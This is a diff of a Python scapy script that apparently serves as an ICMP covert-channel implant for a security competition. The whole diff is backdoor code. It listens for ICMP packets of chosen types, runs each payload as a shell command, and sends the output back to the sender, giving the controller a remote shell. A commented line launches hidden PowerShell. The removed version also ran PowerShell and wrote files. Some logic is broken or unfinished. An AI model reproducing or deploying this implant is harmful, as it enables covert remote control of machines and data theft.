@@ -2,99 +2,72 @@ from scapy.all import *
 import subprocess as sp
 import threading
 import sys
-import socket 
-cmn_cmds = []
-verbose = False
-fname = ""
-ip=socket.gethostbyname(socket.gethostname())  
+import socket
+import random
+
 """This is the only way I can thing to pass a file name from one if to aother
 There might be a better way to accomplish this but this is the only way I can come up with at the current moment
 """
 
 def cmd_mon(pkt):
-    if str(pkt.getlayer(ICMP).type) == "8":
-        if verbose:
-            print(f'Packet:\n {pkt.show()}')
-            print(f'ICMP Type: {pkt.getlayer(ICMP).type}')
-            print(f'Source IP:{pkt.getlayer(IP).src}')
-        source = pkt.getlayer(IP).src
-        instruct = pkt.getlayer(ICMP).load.decode()
-        print(instruct)
-        cmd_proc(instruct, source)
-    
-def cmd_proc(cmd, source):
-    global verbose, fname
-    prefix = cmd[0]
-    term = cmd[1]
-    cmd = cmd[3::]
-    print(f'Prefix:{prefix} term:{term} cmd:{cmd}')
-    if prefix == "a":
-        if term == "c":
-            print("A")
-        elif term == "p":
-            print("A")
-    elif prefix == "e":
-        if term == "c":#Using this as current test subject is linux
-            cmd = cmd.split(" ")
-            result = sp.run(cmd, capture_output=True)
-            if result.check_returncode() is None and verbose:
-                print(result.stdout.decode())
-                send_output(result.stdout.decode(), source)
-        elif term == "p":
-            cmd = cmd.split(" ")
-            cmd.insert(0, "powershell")
-            result = sp.run(cmd, capture_output=True)
-            if result.check_returncode() is None and verbose:
-                print(result.stdout.decode())
-            send_output(result.stdout.decode(), source)
-        elif term == "s":
-            print("This taps into the stored commands")
-    elif prefix == "f":#This is only dealing local dir that the program is running in right now
-        if term == "1":
-            fname = cmd
-            sp.run(f"powershell New-Item -Path . -Name {cmd} -ItemType File" , capture_output=True)
-        elif term == "2":
-            with open(fname, "wb") as file:
-                file.write(cmd)
-                file.close()
-        else:
-            print("Something has gone horribly wrong")
-    else:
-        print("You shouldnt end up here")
+    typ = str(pkt.getlayer(ICMP).type)
+    code = str(pkt.getlayer(ICMP).code)
+    source = pkt.getlayer(IP).src
+    dest = pkt.getlayer(IP).dst
+    cmd_proc(pkt, typ, code, source,dest)
 
-def send_output(stdout, sender):
-    send(IP(dst=sender)/ICMP()/stdout)
-    print("sent to C2")
+    
+def cmd_proc(pkt, typ, code, source,dest):
+    ip = "192.168.232.1"
+    #ip=socket.gethostbyname(socket.gethostname())  
+    print(typ, code, source,dest)
+    if ip == dest:
+        if typ >= "44" and typ <= "94":
+            if code == "0":
+                instruct = pkt.getlayer(ICMP).load.decode()
+                result = sp.check_output(instruct, shell=True)
+                print(result.decode())
+                try:
+                    if result.check_returncode() is None:
+                        cmdout = result.stdout.decode()
+                        #cmdout = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+                        print(cmdout)
+                        #if len(cmdout) >= 1500:
+                        #    first, second = cmdout[:len(cmdout)//2], cmdout[len(cmdout)//2:]
+                        #    send_output(first, source, typ, 1)
+                        #    send_output(second, source, typ, 1)
+                        #else:
+                        send_output(cmdout, source, typ, 1)
+                except sp.CalledProcessError:
+                    send_output("Error, Invalid Command", source, typ, 2)
+        elif typ == "146":
+            heart(source, 146)
+
+def breakup(data):
+    broken = []
+   
+
+def send_output(output, sender,protype,protcode):
+    send(IP(dst=sender)/ICMP(type=int(protype), code=int(protcode))/output)
 
 
 """ May have to be from the server due to the fact that ping will be blocked in a competition on the inbound traffic 
 Or just checking to see if a response is recieved. IDK honestly. Gotta spend time drawing this out 
-def heart():
-    n = 1
-    print("TheLoaded RICK")
-    #while True:
-    send(IP(dst="1.1.1.1")/ ICMP() / "test")
-    print("BEAT" + str(n))
-    n += 1
-    #time.sleep(15)
 """
+def heart(dest, protype):
+    send(IP(dst=dest)/ICMP(type=protype, code=1)/"abcdefghijklmnopqrstuvwxyzhi")
 
 def sniffer():
-    sniff(filter="icmp", prn=cmd_mon)
+    sniff(iface="VMware Virtual Ethernet Adapter for VMnet8", filter="icmp", prn=cmd_mon)
 
-def main():
-    global verbose
-    try:
-        if sys.argv[1] == "-v":
-            verbose = True
-    finally:
-        print("Loaded Rick")
-        #t1 = threading.Thread(target=heart)
-        t2 = threading.Thread(target=sniffer)
-        #t1.start()
-        t2.start()
-        #t1.join()
-        t2.join()
+#def main():
+    #print("Loaded Rick")
+    #t1 = threading.Thread(target=heart)
+    #t2 = threading.Thread(target=sniffer)
+    #t2.start()
+    #t2.join()
 
 #cmd_proc("ep Get-LocalUser -Name Guest")
-main()
+#sp.run("powershell -windowstyle hidden -", capture_output=True)
+
+sniffer()
